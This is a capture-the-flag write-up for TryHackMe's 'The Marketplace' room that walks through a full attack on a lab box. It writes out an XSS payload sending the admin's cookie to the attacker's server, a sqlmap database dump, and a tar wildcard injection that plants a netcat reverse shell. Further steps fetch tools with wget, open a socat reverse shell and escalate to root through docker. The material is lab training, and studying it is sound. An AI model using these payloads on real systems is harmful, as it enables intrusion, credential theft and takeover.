# TryHackMe The Marketplace write up

[https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

## reconnaissance
First of all we are gonna start with some reconnaissance on the box. We will start with a nmap scan.

```nmap -sV -sC -T4 -oN ./nmap_results 10.10.197.179```
the output will be saved in './nmap_results'.

If we check the nmap results we can see the ports 22,80 and 32768 are open.

![alt text](img/nmap.png?raw=true "nmapresult")

There is a webserver running on port 80. If we visit the website we are greeted with what seems to be a simple marketplace.

![alt text](img/web.png?raw=true "web")


We will run a quik dir scan to see if it can find some important directories

```gobuster dir -u http://10.10.81.210:80 -w /usr/share/dirb/wordlists/big.txt > dirbuster.txt```
the output will be saved in 'dirbuster.txt'

![alt text](img/dir.png?raw=true "dir")

we can see a directory named admin, but if we try to acces it we can see the message:
"You are not authorized to view this page!"

We probably need to be logged in as an admin to see this page.

If we create an account we can see that we can create a listing.

If we check out one of the listing we can see an intresting button underneath the img.

![alt text](img/list.png?raw=true "list")

Reporting the listing probably means someone with admin acces is going to inspect the listing. If 
we could find a xss bug in the listing we might be able to grab some admin session cookies.

## 1st flag

If we create a new listing we can try some xss on the description text box.

```<p style="color:red;">cross</p>```

![alt text](img/cross.png?raw=true "cross")

We can see that xss is possible!

Now that we know xss is posible and that we can report our xss listing for a admin to look at we just need a cookie grabbing payload that can send the session cookie to us.

lets first set up a simple webserver to recive the session cookie.

```python3 -m http.server 4013```

We will create a new listing with this this payload to grab the cookie of the browser viewing the html and send it to our webserver

```<img src=x onerror=this.src="http://10.8.71.60:4013/?c="+document.cookie>```

If we report the listing and hope a admin will review the listing maybe we get lucky.

Succes! If we check our simple http server we can see that the request made contain the admin session cookie as a query parameter.

![alt text](img/cookie.png?raw=true "cookie")

We can use the browser dev kit or a cookie extention to add the cookie to our browser. Now we can try to visit the admin page.

![alt text](img/add.png?raw=true "add")



![alt text](img/admin.png?raw=true "admin")

### There's the first flag

## 2nd flag

The second flag is contained in a file called user.txt most likely on the server running the marketplace webserver. So we need to find a way to enter the server.

The server is has port 22 ssh open so if we could find some credentials maybe we could log in to server that way.

Checking the messages of the admin user does not yield any results. If we click on one of the users in the admin panel page we can see the server request some user info for the page. Maybe we could try some LFI or SQLi.

If we try some path traversal symbols as user query parameter we get an intresting error message.

![alt text](img/error.png?raw=true "error")

Now that we no its a SQL query we can try some SQLi query's

```http://10.10.38.31/admin?user=1%20or%201=1```

It doesnt seem to be handeling dangerous characters right and we can perform some sql injection.

Instead of enumerating the database ourself we are going to use a tool called 'SQLmap'

```	sqlmap -u 'http://10.10.155.215/admin?user=1' --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTQ3ODk5NTN9.PRx14zqvlM3V1gR1dPpJ2mPQQ1kPc6fbI3yg4nQKhKc' --technique=U --delay 1 -dump```

* -u = url susceptible for sql
* --cookie = contains our admin cookie so the request are authorized
* --technique= is the technique used for the SQLi in this case UNION query's
* --delay = delay between requests
* -dump = this means dump the database (all tables and columns)

After runnning this command we get the following output.

![alt text](img/data1.png?raw=true "data1")

We can see the users and their hashed password, The hashes seem to be bcrypt format. We could try to use hashcat or john on the hashes
but this takes more than 5 minutes wich means this is probably not the way forward.

If we look back at the output from the sql map

```cat ~/.local/share/sqlmap/output/10.10.155.215/log```

We can see we missed somthing!

![alt text](img/data2.png?raw=true "data2")

If we look in the users table we can see that id 3 belongs to *jake*.

We can now try to use these credentials to ssh into the server

```ssh jake@10.10.26.207```

Succes!

![alt text](img/ssh.png?raw=true "ssh")

### There's the second flag


## 3rd flag

If we try to change directory to root or the markeplace directory's we can see that we dont have the permission to do so.
It is time for us to find a way to escalate our privilages.

We can start the process with some linux enum scripts. I usualy use this [linpeas script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
Since we cannot acces the internet on the THM boxes we need to again setup a simple http server and transfer over the script inside a dir where we have write permissions.

#### attacking box

```python3 -m http.server 4013```

####  victim box

```wget http://10.8.71.60:4013/linpeas.sh```

After that we make it executable

```chmod +x linpeas.sh```

now we can run it

```./linpeas.sh```

![alt text](img/lin1.png?raw=true "lin1")

After checking the results that linpeas found we can see it doesn't really find that many intresting.(There is somthing marked about the debug port but this does not lead anywhere). spitting trough the results we find this

*'User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh'*

If we check the file backup.sh file we can see the following:

![alt text](img/backup.png?raw=true "backup")

We can see the 'tar' command using a * wildcard. wildcards always peak my intress so if we lookup tar wildcard we can find some articles explaining we can exploit this tar command using the wildcard.

The tar command wil put everything (\*) in a archive called backup but if we create some files named like arguments/options because of the wildcard these wil we excuted as such argument/option. You can read more about it [here](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c).
since we can execute this backup.sh command as the user michael we might be able to get a reverse shell as the user michael.
lets try!

```echo "" > --checkpoint=1```
```echo "" > "--checkpoint-action=exec=sh shell.sh"```
```echo 'mkfifo /tmp/ztbkhi; nc 10.8.71.60 4018 0</tmp/ztbkhi | /bin/sh >/tmp/ztbkhi 2>&1; rm /tmp/ztbkhi' > shell.sh```

![alt text](img/exploit.png?raw=true "exploit")

let set up a listner on the attacking machine.

```nc -lvnp 4018```

And now lets run the backup.sh as the user michael.

```sudo -u miachel ./backup.sh```

![alt text](img/no.png?raw=true "no")

Oeps seems like the user michael doesnt have permission to edit the backup.tar file. Since jake does have write permission we can just give everyone rwx permissions

```chmod 777 backup.tar```

now lets try again.

```sudo -u miachel ./backup.sh```

And we have a shell!

![alt text](img/shell.png?raw=true "shell")

Now that we have a shell we can use the linpeas.sh script again but we because the shell is very unstable we might lose it if we attamt to use the script so we first need a better shell.

We are going to use a technique where we transfer over a precompiled binary of the tool called socat to get a stable shell.You can get the binary [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

after that:

####  attacking box

```python3 -m http.server 4013```

#### victim unstable shell

```wget http://10.8.71.60:4013/socat```

#### attacking box 

```socat file:`tty`,raw,echo=0 tcp-listen:4444```

####  victim unstable shell

```chmod 777 ./socat```

```./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.8.71.60:4444```


![alt text](img/shell.png?raw=true "shell")


![alt text](img/better.png?raw=true "better")

Now that we have a better shell we can start the linpeas script wich is still inside jake's home dir.

After we run linpeas we can see it found that michael is part of the docker group. 

![alt text](img/peas2.png?raw=true "peas2")

the docker group is allowed to use the docker command to controll all docker containers on a server wich can be exploiteded to gain root privilages. You can find more about this priv esc [here](https://flast101.github.io/docker-privesc/)

if we use ```docker image list``` we can see that the server has the image 'alpine' installed.

this means we can use the following command to escelate our privlages.

```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```

![alt text](img/flag3.png?raw=true "flag3")

### And that is flag 3!

That was my writeup for 'the marketplace' room on THM.
Thanks for reading, Suggestions & Feedback are appreciated !
















